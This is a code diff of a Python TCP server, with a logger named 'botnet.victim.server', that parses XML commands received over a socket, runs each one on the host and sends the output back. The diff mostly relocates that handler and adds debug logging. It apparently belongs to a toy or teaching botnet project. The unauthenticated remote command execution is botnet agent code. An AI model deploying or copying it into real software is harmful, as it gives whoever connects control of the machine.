@@ -13,10 +13,33 @@ log = logging.getLogger('botnet.victim.server')
 class MyTCPHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
+        log.debug('Receiving data')
         request = self.request.recv(1024).strip().decode()
-        log.debug('Received: %s', request)
+
+        log.debug('Handling request "%s"', request)
         response = self.handle_request(request)
+
+        log.debug('Sending response')
         self.request.sendall(response.encode())
+
+    def handle_request(self, request):
+        log.debug('Parse XML file for commands to execute')
+        xmlfile = io.StringIO(request)
+        root = xml.etree.ElementTree.parse(xmlfile).getroot()
+        output = []
+
+        log.debug('Execute commands from file')
+        for command in root.findall('./command'):
+            cmd = command.text.split()
+            timeout = float(command.get('timeout', 1))
+            stdout = self.execute(cmd, timeout)
+            output.append({
+                'command': cmd,
+                'timeout': timeout,
+                'stdout': stdout,
+            })
+
+        return json.dumps(output)
 
     def execute(self, command, timeout):
         log.debug('Executing command: %s with timeout: %s', command, timeout)
@@ -41,22 +64,6 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
 
                 log.debug('Output: {message}'.format(**locals()))
                 return message
-
-    def handle_request(self, request):
-        xmlfile = io.StringIO(request)
-        root = xml.etree.ElementTree.parse(xmlfile).getroot()
-        output = []
-
-        for command in root.findall('./command'):
-            cmd = command.text.split()
-            timeout = float(command.get('timeout', 1))
-            stdout = self.execute(cmd, timeout)
-            output.append({
-                'command': cmd,
-                'timeout': timeout,
-                'stdout': stdout,
-            })
-        return json.dumps(output)
 
 
 if __name__ == "__main__":
